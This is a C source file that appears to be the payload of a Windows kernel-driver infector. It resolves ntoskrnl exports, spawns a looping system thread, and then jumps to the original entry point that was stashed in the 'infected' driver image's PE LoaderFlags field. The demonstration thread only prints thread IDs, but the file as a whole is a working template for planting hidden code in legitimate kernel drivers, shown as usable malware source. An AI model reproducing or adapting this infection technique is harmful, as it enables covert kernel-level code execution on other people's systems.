#include "pch.h"

typedef int (*DbgPrint_t)( const char* Format, ... );
typedef INT32(*PsGetCurrentThreadId_t)( VOID );
typedef UINT32(*ZwClose_t)( UINT64 );
typedef UINT64(*PsCreateSystemThread_t)( UINT64*, UINT32, UINT64, UINT64, UINT64, UINT64, UINT64 );

UINT64 NtosBase = 0;

D_SEC( B ) VOID ThreadMain( VOID )
{
    while ( TRUE )
    {
        DbgPrint_t DbgPrint = GetExportAddress( NtosBase, "DbgPrint" );
        PsGetCurrentThreadId_t PsGetCurrentThreadId = GetExportAddress( NtosBase, "PsGetCurrentThreadId" );

        INT32 tid = PsGetCurrentThreadId();
        DbgPrint("Current Thread ID: %d\n", tid);
    }
} E_SEC;

D_SEC( A ) UINT32 DriverEntry( PUINT64 a1, PUINT64 a2 )
{
    /* Get ntoskrnl base address */
    NtosBase = GetKernelBase();

    /* Create a thread */
    PsCreateSystemThread_t PsCreateSystemThread = GetExportAddress( NtosBase, "PsCreateSystemThread" );
    UINT64 thread_handle = 0;
    PsCreateSystemThread( &thread_handle, 0x1FFFFF, 0, 0, 0, ThreadMain, 0 );

    /* Close the handle to prevent memory leak */
    ZwClose_t ZwClose = GetExportAddress( NtosBase, "ZwClose" );
    ZwClose( thread_handle );

    /* Get infected image base address */
    UINT64 image_base = GetImageBase( DriverEntry );

    /* Execute the pre-saved Entry Point */
    PIMAGE_DOS_HEADER   Dos = C_PTR( image_base );
    PIMAGE_NT_HEADERS64 Nth = C_PTR( image_base + Dos->e_lfanew );
    return ((UINT32(*)(PUINT64, PUINT64))( image_base + Nth->OptionalHeader.LoaderFlags ))( a1, a2 );
} E_SEC;